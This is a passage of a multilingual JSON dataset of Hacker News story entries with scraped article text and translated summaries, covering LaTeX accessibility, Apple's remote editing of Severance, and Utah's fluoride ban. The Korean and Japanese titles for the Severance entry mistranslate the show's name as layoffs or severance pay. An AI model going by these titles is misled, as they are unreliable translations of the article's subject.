      "ja": "主な問題は、数学関連の分野で高品質な文書を作成するために広く使われているLaTeXが、PDF形式のみで出力されることです。この形式は多くのユーザーにとってアクセスしづらく、PDFは異なるデバイスやフォーマットに簡単に調整できず、スクリーンリーダーに必要な意味情報も提供しません。\n\nより良い解決策は、HTMLを使用することです。HTMLはアクセスしやすく、支援技術とも相性が良いですが、数学の数式をHTMLで表示するのは難しい場合があります。MathMLはこの目的のために設計されたフォーマットですが、すべてのウェブブラウザで完全にサポートされているわけではありません。MathJaxを使うことで、ウェブページ上で数式を正しく表示することができます。\n\nLaTeXの代替手段には、いくつかのツールがあります。Pressbooksはウェブベースのツールで、LaTeXをサポートしていますが、数学関連の分野ではあまり普及していません。PreTeXtはXMLベースのプラットフォームで、コンテンツをHTMLやLaTeXなどの複数のフォーマットに変換できます。Markdownはシンプルなマークアップ言語で、さまざまなフォーマットに簡単に変換でき、統計学などの分野で人気があります。\n\nそれぞれの代替手段には利点と欠点があり、特に既存のLaTeXプロジェクトの複雑さに関しては課題があります。著者は新しいツールや言語を学ぶ必要があり、LaTeXの広範な機能のエコシステムとは異なります。\n\n別の選択肢として、LaTeX文書をHTMLに変換するツールであるLaTeXMLを使用する方法があります。これは効果的ですが、出力を視覚的に魅力的にするためには追加の作業が必要です。BookMLは、オンライン学習システム向けにスタイリングオプションや機能を提供することで、このプロセスを強化できます。\n\nカルガリー大学の事例研究では、オープンテキストブックがアクセシビリティのために成功裏に適応された方法が示されています。これは、LaTeXをHTMLに変換し、スクリーンリーダーとの互換性を確保することを含みます。\n\nアクセシビリティのテストは難しい場合があり、多くの自動化ツールが存在しますが、徹底的なテストには専門知識やリソースが必要です。著者は、異なるスクリーンリーダーやユーザーのニーズに対してアクセシビリティ機能のバランスを取ることに苦労しました。\n\n全体として、この文書は数学関連の教育リソースをアクセスしやすくすることの重要性と、その目標を達成するための課題を強調しています。"
    }
  },
  {
    "id": "9ccc844f2b8904d1",
    "title": {
      "en": "Why Apple's Severance gets edited over remote desktop software",
      "ko": "애플의 해고, 원격 소프트웨어 논란",
      "ja": "アップルの退職金問題"
    },
    "type": "story",
    "url": "https://tedium.co/2025/03/29/severance-apple-remote-editing-weirdness/",
    "score": 353,
    "by": "shortformblog",
    "time": 1743271248,
    "content": "Severed Edits\n\n                    Whether it was trying to or not, Apple exposed a huge flaw with its pitch to professional video editors with a new Severance promotional video.\n\n                    By Ernie Smith •\n                    March 29, 2025\n\n                    https://static.tedium.co/uploads/SeveranceEditor.gif\n\n                                    #remote editing\n\n                                    #remote desktop access\n\n                                    #video editing\n\n                                    #editing\n\n                                    #severance\n\n                                    #tv shows\n\n                                    #apple\n\n                                    #macos\n\n                                    #virtual machine\n\n                    When it comes to Apple’s TV ambitions, it couldn't buy better marketing than the buzz around Severance. (Certainly beats talking about Apple Intelligence.)It is both Apple’s most ambitious and (apologies to Ted Lasso) successful production, expanding the Apple brand by highlighting just how smart it is. At a time when HBO seems to want to be HBO less and less, Apple TV+ has certainly taken up the mantle and then some.But it of course raises the question: Do they make Apple‘s shows on Macs? As the second season of Severance ended in dramatic fashion, Apple decided to answer that question, and the answer was … surprisingly confusing.lite-youtube {\n    background-color: #000;\n    position: relative;\n    display: block;\n    contain: content;\n    background-position: center center;\n    background-size: cover;\n    cursor: pointer;\n    max-width: 720px;\n}\n\n/* gradient */\nlite-youtube::before {\n    content: attr(data-title);\n    display: block;\n    position: absolute;\n    top: 0;\n    /* Pixel-perfect port of YT's gradient PNG, using https://github.com/bluesmoon/pngtocss plus optimizations */\n    background-image: linear-gradient(180deg, rgb(0 0 0 / 67%) 0%, rgb(0 0 0 / 54%) 14%, rgb(0 0 0 / 15%) 54%, rgb(0 0 0 / 5%) 72%, rgb(0 0 0 / 0%) 94%);\n    height: 99px;\n    width: 100%;\n    font-family: \"YouTube Noto\",Roboto,Arial,Helvetica,sans-serif;\n    color: hsl(0deg 0% 93.33%);\n    text-shadow: 0 0 2px rgba(0,0,0,.5);\n    font-size: 18px;\n    padding: 25px 20px;\n    overflow: hidden;\n    white-space: nowrap;\n    text-overflow: ellipsis;\n    box-sizing: border-box;\n}\n\nlite-youtube:hover::before {\n    color: white;\n}\n\n/* responsive iframe with a 16:9 aspect ratio\n    thanks https://css-tricks.com/responsive-iframes/\n*/\nlite-youtube::after {\n    content: \"\";\n    display: block;\n    padding-bottom: calc(100% / (16 / 9));\n}\nlite-youtube > iframe {\n    width: 100%;\n    height: 100%;\n    position: absolute;\n    top: 0;\n    left: 0;\n    border: 0;\n}\n\n/* play button */\nlite-youtube > .lty-playbtn {\n    display: block;\n    /* Make the button element cover the whole area for a large hover/click target… */\n    width: 100%;\n    height: 100%;\n    /* …but visually it's still the same size */\n    background: no-repeat center/68px 48px;\n    /* YT's actual play button svg */\n    background-image: url('data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 68 48\"><path d=\"M66.52 7.74c-.78-2.93-2.49-5.41-5.42-6.19C55.79.13 34 0 34 0S12.21.13 6.9 1.55c-2.93.78-4.63 3.26-5.42 6.19C.06 13.05 0 24 0 24s.06 10.95 1.48 16.26c.78 2.93 2.49 5.41 5.42 6.19C12.21 47.87 34 48 34 48s21.79-.13 27.1-1.55c2.93-.78 4.64-3.26 5.42-6.19C67.94 34.95 68 24 68 24s-.06-10.95-1.48-16.26z\" fill=\"red\"/><path d=\"M45 24 27 14v20\" fill=\"white\"/></svg>');\n    position: absolute;\n    cursor: pointer;\n    z-index: 1;\n    filter: grayscale(100%);\n    transition: filter .1s cubic-bezier(0, 0, 0.2, 1);\n    border: 0;\n}\n\nlite-youtube:hover > .lty-playbtn,\nlite-youtube .lty-playbtn:focus {\n    filter: none;\n}\n\n/* Post-click styles */\nlite-youtube.lyt-activated {\n    cursor: unset;\n}\nlite-youtube.lyt-activated::before,\nlite-youtube.lyt-activated > .lty-playbtn {\n    opacity: 0;\n    pointer-events: none;\n}\n\n.lyt-visually-hidden {\n    clip: rect(0 0 0 0);\n    clip-path: inset(50%);\n    height: 1px;\n    overflow: hidden;\n    position: absolute;\n    white-space: nowrap;\n    width: 1px;\n  }\n\n/**\n * A lightweight youtube embed. Still should feel the same to the user, just MUCH faster to initialize and paint.\n *\n * Thx to these as the inspiration\n *   https://storage.googleapis.com/amp-vs-non-amp/youtube-lazy.html\n *   https://autoplay-youtube-player.glitch.me/\n *\n * Once built it, I also found these:\n *   https://github.com/ampproject/amphtml/blob/master/extensions/amp-youtube (👍👍)\n *   https://github.com/Daugilas/lazyYT\n *   https://github.com/vb/lazyframe\n */\nclass LiteYTEmbed extends HTMLElement {\n    connectedCallback() {\n        this.videoId = this.getAttribute('videoid');\n\n        let playBtnEl = this.querySelector('.lty-playbtn');\n        // A label for the button takes priority over a [playlabel] attribute on the custom-element\n        this.playLabel = (playBtnEl && playBtnEl.textContent.trim()) || this.getAttribute('playlabel') || 'Play';\n\n        this.dataset.title = this.getAttribute('title') || \"\";\n\n        /**\n         * Lo, the youtube poster image!  (aka the thumbnail, image placeholder, etc)\n         *\n         * See https://github.com/paulirish/lite-youtube-embed/blob/master/youtube-thumbnail-urls.md\n         */\n        if (!this.style.backgroundImage) {\n          this.style.backgroundImage = `url(\"https://i.ytimg.com/vi/${this.videoId}/hqdefault.jpg\")`;\n          this.upgradePosterImage();\n        }\n\n        // Set up play button, and its visually hidden label\n        if (!playBtnEl) {\n            playBtnEl = document.createElement('button');\n            playBtnEl.type = 'button';\n            playBtnEl.classList.add('lty-playbtn');\n            this.append(playBtnEl);\n        }\n        if (!playBtnEl.textContent) {\n            const playBtnLabelEl = document.createElement('span');\n            playBtnLabelEl.className = 'lyt-visually-hidden';\n            playBtnLabelEl.textContent = this.playLabel;\n            playBtnEl.append(playBtnLabelEl);\n        }\n\n        this.addNoscriptIframe();\n\n        // for the PE pattern, change anchor's semantics to button\n        if(playBtnEl.nodeName === 'A'){\n            playBtnEl.removeAttribute('href');\n            playBtnEl.setAttribute('tabindex', '0');\n            playBtnEl.setAttribute('role', 'button');\n            // fake button needs keyboard help\n            playBtnEl.addEventListener('keydown', e => {\n                if( e.key === 'Enter' || e.key === ' ' ){\n                    e.preventDefault();\n                    this.activate();\n                }\n            });\n        }\n\n        // On hover (or tap), warm up the TCP connections we're (likely) about to use.\n        this.addEventListener('pointerover', LiteYTEmbed.warmConnections, {once: true});\n        this.addEventListener('focusin', LiteYTEmbed.warmConnections, {once: true});\n\n        // Once the user clicks, add the real iframe and drop our play button\n        // TODO: In the future we could be like amp-youtube and silently swap in the iframe during idle time\n        //   We'd want to only do this for in-viewport or near-viewport ones: https://github.com/ampproject/amphtml/pull/5003\n        this.addEventListener('click', this.activate);\n\n        // Chrome & Edge desktop have no problem with the basic YouTube Embed with ?autoplay=1\n        // However Safari desktop and most/all mobile browsers do not successfully track the user gesture of clicking through the creation/loading of the iframe,\n        // so they don't autoplay automatically. Instead we must load an additional 2 sequential JS files (1KB + 165KB) (un-br) for the YT Player API\n        // TODO: Try loading the the YT API in parallel with our iframe and then attaching/playing it. #82\n        this.needsYTApi = this.hasAttribute(\"js-api\") || navigator.vendor.includes('Apple') || navigator.userAgent.includes('Mobi');\n    }\n\n    /**\n     * Add a <link rel={preload | preconnect} ...> to the head\n     */\n    static addPrefetch(kind, url, as) {\n        const linkEl = document.createElement('link');\n        linkEl.rel = kind;\n        linkEl.href = url;\n        if (as) {\n            linkEl.as = as;\n        }\n        document.head.append(linkEl);\n    }\n\n    /**\n     * Begin pre-connecting to warm up the iframe load\n     * Since the embed's network requests load within its iframe,\n     *   preload/prefetch'ing them outside the iframe will only cause double-downloads.\n     * So, the best we can do is warm up a few connections to origins that are in the critical path.\n     *\n     * Maybe `<link rel=preload as=document>` would work, but it's unsupported: http://crbug.com/593267\n     * But TBH, I don't think it'll happen soon with Site Isolation and split caches adding serious complexity.\n     */\n    static warmConnections() {\n        if (LiteYTEmbed.preconnected) return;\n\n        // The iframe document and most of its subresources come right off youtube.com\n        LiteYTEmbed.addPrefetch('preconnect', 'https://www.youtube-nocookie.com');\n        // The botguard script is fetched off from google.com\n        LiteYTEmbed.addPrefetch('preconnect', 'https://www.google.com');\n\n        // Not certain if these ad related domains are in the critical path. Could verify with domain-specific throttling.\n        LiteYTEmbed.addPrefetch('preconnect', 'https://googleads.g.doubleclick.net');\n        LiteYTEmbed.addPrefetch('preconnect', 'https://static.doubleclick.net');\n\n        LiteYTEmbed.preconnected = true;\n    }\n\n    fetchYTPlayerApi() {\n        if (window.YT || (window.YT && window.YT.Player)) return;\n\n        this.ytApiPromise = new Promise((res, rej) => {\n            var el = document.createElement('script');\n            el.src = 'https://www.youtube.com/iframe_api';\n            el.async = true;\n            el.onload = _ => {\n                YT.ready(res);\n            };\n            el.onerror = rej;\n            this.append(el);\n        });\n    }\n\n    /** Return the YT Player API instance. (Public L-YT-E API) */\n    async getYTPlayer() {\n        if(!this.playerPromise) {\n            await this.activate();\n        }\n\n        return this.playerPromise;\n    }\n\n    async addYTPlayerIframe() {\n        this.fetchYTPlayerApi();\n        await this.ytApiPromise;\n\n        const videoPlaceholderEl = document.createElement('div')\n        this.append(videoPlaceholderEl);\n\n        const paramsObj = Object.fromEntries(this.getParams().entries());\n\n        this.playerPromise = new Promise(resolve => {\n            let player = new YT.Player(videoPlaceholderEl, {\n                width: '100%',\n                videoId: this.videoId,\n                playerVars: paramsObj,\n                events: {\n                    'onReady': event => {\n                        event.target.playVideo();\n                        resolve(player);\n                    }\n                }\n            });\n        });\n    }\n\n    // Add the iframe within <noscript> for indexability discoverability. See https://github.com/paulirish/lite-youtube-embed/issues/105\n    addNoscriptIframe() {\n        const iframeEl = this.createBasicIframe();\n        const noscriptEl = document.createElement('noscript');\n        // Appending into noscript isn't equivalant for mysterious reasons: https://html.spec.whatwg.org/multipage/scripting.html#the-noscript-element\n        noscriptEl.innerHTML = iframeEl.outerHTML;\n        this.append(noscriptEl);\n    }\n\n    getParams() {\n        const params = new URLSearchParams(this.getAttribute('params') || []);\n        params.append('autoplay', '1');\n        params.append('playsinline', '1');\n        return params;\n    }\n\n    async activate(){\n        if (this.classList.contains('lyt-activated')) return;\n        this.classList.add('lyt-activated');\n\n        if (this.needsYTApi) {\n            return this.addYTPlayerIframe(this.getParams());\n        }\n\n        const iframeEl = this.createBasicIframe();\n        this.append(iframeEl);\n\n        // Set focus for a11y\n        iframeEl.focus();\n    }\n\n    createBasicIframe(){\n        const iframeEl = document.createElement('iframe');\n        iframeEl.width = 560;\n        iframeEl.height = 315;\n        // No encoding necessary as [title] is safe. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#:~:text=Safe%20HTML%20Attributes%20include\n        iframeEl.title = this.playLabel;\n        iframeEl.allow = 'accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture';\n        iframeEl.allowFullscreen = true;\n        // AFAIK, the encoding here isn't necessary for XSS, but we'll do it only because this is a URL\n        // https://stackoverflow.com/q/64959723/89484\n        iframeEl.src = `https://www.youtube-nocookie.com/embed/${encodeURIComponent(this.videoId)}?${this.getParams().toString()}`;\n        return iframeEl;\n    }\n\n    /**\n     * In the spirit of the `lowsrc` attribute and progressive JPEGs, we'll upgrade the reliable\n     * poster image to a higher resolution one, if it's available.\n     * Interestingly this sddefault webp is often smaller in filesize, but we will still attempt it second\n     * because getting _an_ image in front of the user if our first priority.\n     *\n     * See https://github.com/paulirish/lite-youtube-embed/blob/master/youtube-thumbnail-urls.md for more details\n     */\n    upgradePosterImage() {\n         // Defer to reduce network contention.\n        setTimeout(() => {\n            const webpUrl = `https://i.ytimg.com/vi_webp/${this.videoId}/sddefault.webp`;\n            const img = new Image();\n            img.fetchPriority = 'low'; // low priority to reduce network contention\n            img.referrerpolicy = 'origin'; // Not 100% sure it's needed, but https://github.com/ampproject/amphtml/pull/3940\n            img.src = webpUrl;\n            img.onload = e => {\n                // A pretty ugly hack since onerror won't fire on YouTube image 404. This is (probably) due to\n                // Youtube's style of returning data even with a 404 status. That data is a 120x90 placeholder image.\n                // … per \"annoying yt 404 behavior\" in the .md\n                const noAvailablePoster = e.target.naturalHeight == 90 && e.target.naturalWidth == 120;\n                if (noAvailablePoster) return;\n\n                this.style.backgroundImage = `url(\"${webpUrl}\")`;\n            }\n        }, 100);\n    }\n}\n// Register custom element\ncustomElements.define('lite-youtube', LiteYTEmbed);\n\n.eleventy-plugin-youtube-embed lite-youtube {max-width:100%}\nPlay<iframe width=\"560\" height=\"315\" title=\"Play\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen=\"\" src=\"https://www.youtube-nocookie.com/embed/TXNQ01Sy6Xw?modestbranding=1&amp;autoplay=1&amp;playsinline=1\"></iframe>In the video Apple released, which highlights the Mac-driven editing process that Ben Stiller's team is using, something stood out to me: Wait, the video is super-jittery—this makes the Mac Mini look rough. What's going on?Then, after about 10 minutes of watching, I saw it: The show’s lead editor, Geoffrey Richman, was working on a remote Mac through Jump Desktop, a screen sharing tool known for its high-speed “fluid remote desktop” feature. I’ve used this tool. Though I’m not really rocking a Mac these days, I’m a fan.Here’s the exact moment it hit me, carefully cropped to avoid spoilers:In other words, little of the horsepower being used in this editing process is actually coming from the Mac Mini on this guy’s desk. Instead, it’s being driven by another Mac on the other side of a speedy internet connection. Given that the Jump Desktop app window was hidden away in an earlier part of the clip, I’m not entirely sure we were supposed to see that, but there it is. Oops.(To be fair, the promotional materials do not hide that this is a remote process, but they do not mention the use of Jump Desktop, which seems like a missed opportunity to promote a small-scale Mac developer. C’mon Apple, do better.)So here's a challenge about video production that is unique to the film and television mediums: There is a genuine risk of stuff getting pirated before it's ready. Beyond tethering everyone to NDAs, some of this can be avoided by having the editors work in a centralized place, avoiding networked access to the video files. After all, if an editor goes rogue, you can just take away their key card. There are even standards, produced by the Content Delivery and Security Association, on how film studios can protect their works mid-edit.One problem: COVID-19 made the prior strategy of localizing the editors in the same place untenable. Sponsored By TLDR Want a byte-sized version of Hacker News? Try TLDR’s free daily newsletter.TLDR covers the most interesting tech, science, and coding news in just 5 minutes.No sports, politics, or weather.Subscribe for free!This means that a new normal in the video production realm is the rise of “remote editing,” in which editors use remote access software to do the editing on a virtual machine or office workstation. High speed connections are necessary to make this work on both ends—meaning Starbucks is off the table—but it's more than possible. Jump Desktop is a good option for this, but Parsec is arguably an even better one.This also has other benefits. For one thing, high-end video production is quite storage-intensive, which is why your favorite YouTuber constantly talks about their editing rigs and network-attached storage. By putting this stuff offsite, they can put all this data on a real server.To me, though, it highlights a huge issue with Apple’s current professional offerings. They are built to work on a single machine. At least for high-end use cases, the remote workflow threatens to cut them out of the equation entirely, as cloud devices with access to nearly unlimited resources gradually outpace individual machines. In fact, there is a version of the editor he was using, Avid Media Composer, that is cloud-based and built specifically for this very use case.The astounding part of this editing process, which Apple wanted to highlight so much that they shot an entire film about it, is that the Macs are honestly the least important part of the workflow. If Jump Desktop made a Chromebook version of its app, the Mac on Richman’s desk wouldn't even be necessary. Not that he would want to, but he could do this on a Chromebook.Put another way, if Stiller's team was building this for Amazon or Netflix, would that be a Mac Mini on Richman’s desk, or an HP or Lenovo box? Why even use a Mac in this editing process at all, when other companies offer access to better GPUs anyway?See, one issue with the way Apple sells its machines at the enterprise level is that they basically have no traditional server offerings, despite that being the norm elsewhere. If you want to run a Mac in the cloud, it has to be a full machine in most cases. Worse, it can’t be split up into a bunch of virtual machines, thanks to requirements in its EULA that seem designed to protect its hardware business above all else.At the enterprise or cloud level, where VMs are quite common, this is hugely inefficient. Often large companies will buy the most powerful servers they can and parse them out into smaller pieces. Apple’s end-user license agreement for MacOS Sequoia specifically limits the upside of such an approach:Virtualization. For each copy of the Apple Software subject to a lease under this Section 3, either a Lessor or a Lessee (but not both) may install, use and run additional copies or instances of the Apple Software within virtual operating system environments in accordance with Section 2B (iii), provided that a Lessor may only virtualize a single instance or copy of the Apple Software as a provisioning tool for the purpose of providing a Lessee with access to and use of the Apple Software pursuant to this Section 3.Apple used to serve this market with a device called Xserve, but it essentially gave it up about 15 years ago. Almost unwittingly, this video highlights the folly of that decision, which became more obvious thanks to COVID-19 and the rise of remote work.It’s not quite accurate to say that the Mac Mini is just for show, but it’s less necessary for making this setup work than it appears at first glance.These editors aren't working on Macs, per se. They're working around them. Sure, there's an Apple logo in the top-left corner (two, actually), but it feels superfluous, knowing that the software isn’t directly on the machine and it just as easily be running on a Windows or Linux box a thousand miles away. There are way more efficient ways to do this, and Apple doesn't offer them. Instead it relies on cloud providers like MacStadium, or localized IT teams, to work around their convoluted rules around VMs. Meanwhile, Microsoft’s emphasis on VMs, as highlighted by its Windows 365 offering, tee them up for a future of scaleable remote editing.Hence why this editor is using a remote access tool by a tiny company to help produce Apple’s most important TV show. If I were Apple, I would ask my software team why they've saddled their most significant and influential high-end users with such a weird-ass setup.Then I would figure out how to fix it.Unsevered LinksSpeaking of Apple, I agree with this guy.It’s hard to find a modern vehicle without a giant infotainment screen inside of it, but it turns out that the screens are surprisingly unpopular with drivers, per Gizmodo.Play<iframe width=\"560\" height=\"315\" title=\"Play\" allow=\"accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen=\"\" src=\"https://www.youtube-nocookie.com/embed/aaNdMAGEsqk?modestbranding=1&amp;autoplay=1&amp;playsinline=1\"></iframe>Jesse Welles made his national television debut the other night, playing for Jimmy Kimmel’s audience. Also, he released an album of all of his YouTube performances, and the reason he did so, according to Saving Country Music, is super-interesting and surprisingly technical.--Find this one an interesting read? Share it with a pal! And back at it in a couple of days with a fresh one.",
    "summary": {
      "en": "Apple's recent promotional video for the TV show *Severance* unintentionally revealed a significant flaw in its appeal to professional video editors. The video showcased the editing process using a Mac, but it became clear that the editing was actually done remotely via a screen-sharing tool called Jump Desktop. This means that the powerful editing capabilities were not coming from the Mac Mini on screen, but from another Mac located elsewhere.\n\nThis highlights a critical issue: Apple’s professional offerings are designed for single machines, which can be a disadvantage in the growing field of remote editing. Many editors are now using cloud-based tools, which could potentially outperform individual Macs. Apple's lack of traditional server options and limitations on virtual machine use make it less competitive in this area.\n\nAs remote editing becomes more common, especially post-COVID, Apple may need to rethink its approach to better serve high-end users. The video inadvertently shows that while the Macs featured are present, they are not central to the editing process, suggesting that Apple's offerings could be outpaced by competitors who focus on cloud services and virtual machines.",
      "ko": "애플의 최근 TV 프로그램 *Severance* 홍보 영상은 전문 비디오 편집자들에게 중요한 결점을 드러냈다. 이 영상은 맥을 사용한 편집 과정을 보여주었지만, 실제로는 Jump Desktop이라는 화면 공유 도구를 통해 원격으로 편집이 이루어졌다는 사실이 드러났다. 즉, 화면에 보이는 맥 미니의 강력한 편집 기능은 다른 장소에 있는 맥에서 제공된 것이었다.\n\n이로 인해 중요한 문제가 부각된다. 애플의 전문 제품은 단일 기기를 위해 설계되었기 때문에 원격 편집이 증가하는 상황에서는 불리할 수 있다. 많은 편집자들이 이제 클라우드 기반 도구를 사용하고 있으며, 이는 개별 맥보다 더 뛰어난 성능을 발휘할 가능성이 있다. 애플은 전통적인 서버 옵션이 부족하고 가상 머신 사용에 제한이 있어 이 분야에서 경쟁력이 떨어진다.\n\n특히 COVID-19 이후 원격 편집이 보편화됨에 따라, 애플은 고급 사용자에게 더 나은 서비스를 제공하기 위해 접근 방식을 재고할 필요가 있을 것이다. 이 영상은 맥이 존재하지만 편집 과정의 중심이 아니라는 점을 보여주며, 클라우드 서비스와 가상 머신에 집중하는 경쟁자들에게 애플의 제품이 뒤처질 수 있음을 시사한다.",
      "ja": "Appleが最近公開したテレビ番組『セヴァランス』のプロモーションビデオは、プロのビデオ編集者に対するアピールにおいて重要な欠陥を無意識のうちに明らかにしました。このビデオではMacを使った編集プロセスが紹介されましたが、実際にはJump Desktopという画面共有ツールを通じてリモートで編集が行われていることが分かりました。つまり、画面上のMac Miniからではなく、別の場所にあるMacから強力な編集機能が提供されていたのです。\n\nこれは重要な問題を浮き彫りにしています。Appleのプロ向け製品は単一のマシン向けに設計されており、リモート編集が普及する中で不利になる可能性があります。多くの編集者は現在、クラウドベースのツールを使用しており、これらは個々のMacを上回る性能を発揮することがあります。Appleは従来のサーバーオプションが不足しており、仮想マシンの使用にも制限があるため、この分野での競争力が低下しています。\n\n特にCOVID以降、リモート編集が一般的になる中で、Appleは高級ユーザーにより良いサービスを提供するためにアプローチを見直す必要があるかもしれません。このビデオは、Macが登場しているものの、編集プロセスの中心ではないことを示しており、クラウドサービスや仮想マシンに焦点を当てる競合他社に追い抜かれる可能性があることを示唆しています。"
    }
  },
  {
    "id": "0f4766ce7f9c48be",
    "title": {
      "en": "Utah becomes first US state to ban fluoride in its water",
      "ko": "유타, 미국 최초 불소 금지",
      "ja": "ユタ州、フッ素禁止！"
    },
    "type": "story",
    "url": "https://www.bbc.com/news/articles/c4gmggp2y99o",
    "score": 69,
    "by": "Jimmc414",
    "time": 1743275945,
    "content": "Utah becomes first US state to ban fluoride in its water10 hours agoShareSaveNadine YousifBBC NewsShareSaveGetty ImagesUtah governor Spencer Cox signed the fluoride ban into law this weekUtah has become the first US state to ban the use of fluoride in its public water, following concerns raised by health secretary Robert F Kennedy that the mineral poses potential health risks.Governor Spencer Cox signed the ban into law this week, which will go into effect on 7 May. Other states, including Florida and Ohio, are weighing similar legislation.Fluoride has been added to US drinking water since 1945 to prevent cavities.Utah's move to remove the mineral has been criticised by experts, who worry it will have consequences for oral health, especially for children.The bill, signed by Cox on Thursday, prohibits communities from adding fluoride to their public water supplies.The law does not mention any public health concerns related to the mineral, but Republican state lawmaker Stephanie Gricius - who introduced the bill in the state legislature - has argued that there is research suggesting fluoride could have possible cognitive effects in children.Gricius has said that her bill would give citizens a choice whether they want to consume fluoride or not.This concern over fluoride was previously raised by Kennedy, the US health secretary, who said in November that \"the Trump White House will advise all US water systems to remove fluoride from public water\".He alleged the chemical found in toothpaste and regularly used by dentists \"is an industrial waste associated with arthritis, bone fractures, bone cancer, IQ loss, neurodevelopmental disorders, and thyroid disease\".Most public health experts have rejected these claims and alleged that Kennedy had cited data from studies conducted in countries with far higher levels of fluoride in their water systems than the US has. The American Dental Association sharply criticised Utah for its decision, saying that it shows \"wanton disregard for the oral health and well-being of their constituents\".\"It is disheartening to see that a proven, public health policy, which exists for the greater good of an entire community's oral health, has been dismantled based on distorted pseudoscience,\" the association's president, Denver dentist Brett Kessler, said in a statement.Many public health groups, including the American Academy of Pediatrics and the Centers for Disease Control and Prevention, have long supported adding small amounts of fluoride to drinking water. The US Public Health Service reduced the amount of fluoride it recommended adding to water in 2015, but the federal government has encouraged states since the 1960s to add small amounts of the chemical to water to help prevent cavities and aid oral health.Recent court rulings have led to the reduction of fluoride in US water, and some experts have questioned the continued need for it in water systems given its wide availability in toothpaste and other dental products.Most of western Europe does not add fluoride to its water. In England, about one in 10 people has fluoridated drinking water, though a programme has since been introduced to fluoridate water for 1.6 million people in north-east England.By contrast, around 63% of the US population have fluoridated water.Experts who support putting fluoride in water says studies show that community water fluoridation prevents at least 25% of tooth decay in children and adults.\"The scientific weight of sound evidence around the benefit of community water fluoridation is clear and compelling,\" the American Dental Association said in October of last year.Prof Avijit Banerjee, chair of cariology and operative dentistry at King's College London, previously told the BBC that \"the potential harmful effects of fluoride cited have not been associated with the very low levels of fluoride used in water fluoridation programmes\".What RFK Jr could do on US vaccines, fluoride and drugsFact-checking RFK Jr's views on health policyCalls for fluoride in water to combat child tooth decayWater fluoridation expansion plans confirmedUS politicsUnited StatesUtahRobert F Kennedy Jr",
    "summary": {
      "en": "Utah has become the first state in the U.S. to ban fluoride in public drinking water, with the law signed by Governor Spencer Cox taking effect on May 7. This decision follows concerns from health officials, including Robert F. Kennedy Jr., who suggested that fluoride may have health risks, particularly for children. Critics, including dental health experts, argue that removing fluoride could harm oral health, as it has been used since 1945 to prevent cavities.\n\nThe new law prohibits communities from adding fluoride to their water supplies, and supporters of the ban argue it gives people the choice to consume fluoride or not. However, many public health organizations, including the American Dental Association and the Centers for Disease Control and Prevention, advocate for fluoride in water, citing its benefits in reducing tooth decay. They argue that the potential risks associated with fluoride are not supported by evidence from the low levels used in water systems. \n\nWhile some other states like Florida and Ohio are considering similar bans, experts warn that Utah's decision could negatively impact public health, especially for children.",
      "ko": "유타주가 미국에서 공공 음용수에 불소를 금지한 첫 번째 주가 되었습니다. 스펜서 콕스 주지사가 서명한 이 법안은 5월 7일부터 시행됩니다. 이 결정은 로버트 F. 케네디 주니어를 포함한 보건 당국자들의 우려에 따른 것으로, 불소가 특히 어린이에게 건강 위험을 초래할 수 있다고 제기되었습니다. 반면, 치과 건강 전문가들은 불소를 제거하면 구강 건강에 해로울 수 있다고 주장하며, 불소는 1945년부터 충치를 예방하는 데 사용되어 왔습니다.\n\n새로운 법안은 지역 사회가 수돗물에 불소를 추가하는 것을 금지합니다. 이 금지 조치를 지지하는 사람들은 개인이 불소를 섭취할지 말지를 선택할 수 있는 권리를 준다고 주장합니다. 그러나 미국치과협회와 질병통제예방센터를 포함한 많은 공공 보건 단체들은 불소가 충치 예방에 도움이 된다고 주장하며, 물 시스템에서 사용되는 낮은 수준의 불소와 관련된 잠재적 위험은 증거로 뒷받침되지 않는다고 반박합니다.\n\n플로리다와 오하이오와 같은 다른 주들도 유사한 금지를 고려하고 있지만, 전문가들은 유타의 결정이 특히 어린이의 공공 건강에 부정적인 영향을 미칠 수 있다고 경고하고 있습니다.",
      "ja": "ユタ州は、アメリカで初めて公共の飲料水にフッ素を添加することを禁止する法律を制定しました。この法律は、スぺンサー・コックス知事によって署名され、5月7日に施行されます。この決定は、ロバート・F・ケネディ・ジュニアを含む健康専門家の懸念を受けたもので、フッ素が特に子供に対して健康リスクをもたらす可能性があると指摘されています。一方で、歯科医療の専門家たちは、フッ素を取り除くことが口腔の健康に悪影響を及ぼす可能性があると批判しています。フッ素は1945年から虫歯予防に使用されてきました。\n\n新しい法律は、地域社会が水道水にフッ素を添加することを禁止しています。この禁止に賛成する人々は、フッ素を摂取するかどうかの選択肢を人々に与えると主張しています。しかし、アメリカ歯科医師会や疾病予防管理センターなど、多くの公衆衛生団体は、水道水にフッ素を含めることを支持しており、虫歯の予防におけるその利点を挙げています。彼らは、水道システムで使用される低濃度のフッ素に関する潜在的なリスクは、証拠に基づいていないと主張しています。\n\nフロリダ州やオハイオ州など、他の州でも同様の禁止を検討しているところがありますが、専門家たちはユタ州の決定が特に子供たちの公衆衛生に悪影響を及ぼす可能性があると警告しています。"
    }
  },
  {
    "id": "599bef1fb1033921",
    "title": {
      "en": "Paged Out #6 is out",
      "ko": null,
      "ja": null
    },
    "type": "story",
    "url": "https://pagedout.institute/?page=blog.php#entry-2025-03-29",
    "score": 178,
    "by": "pcfwik",
    "time": 1743271923,
    "content": null,
    "summary": {
      "en": null,
      "ko": null,
      "ja": null
    }
  },
  {
    "id": "049c1756ef2992b1",
    "title": {
      "en": "The Mysterious Flow of Fluid in the Brain",
      "ko": "뇌 속 신비한 유동",
      "ja": "脳内の謎の流れ"
    },
    "type": "story",
    "url": "https://www.quantamagazine.org/the-mysterious-flow-of-fluid-in-the-brain-20250326/",
    "score": 9,
    "by": "isaacfrond",
    "time": 1743000542,
    "content": "Quanta Homepage\n\n                                        Physics\n\n                                        Mathematics\n\n                                        Biology\n\n                                        Computer Science\n\n                                        Topics\n\n                                        Archive\n\n                                        Blog\n\n                                        Columns\n\n                                        Interviews\n\n                                        Podcasts\n\n                                        Puzzles\n\n                                        Multimedia\n\n                                        Videos\n\n                                        About Quanta\n\n                                    An editorially independent publication supported by the Simons Foundation.\n\n                                    Follow Quanta\n\n    Facebook\n\n        Youtube\n\n        Instagram\n\n    RSS\n\n                Newsletter\n\n                    Get the latest news delivered to your inbox.\n\n                            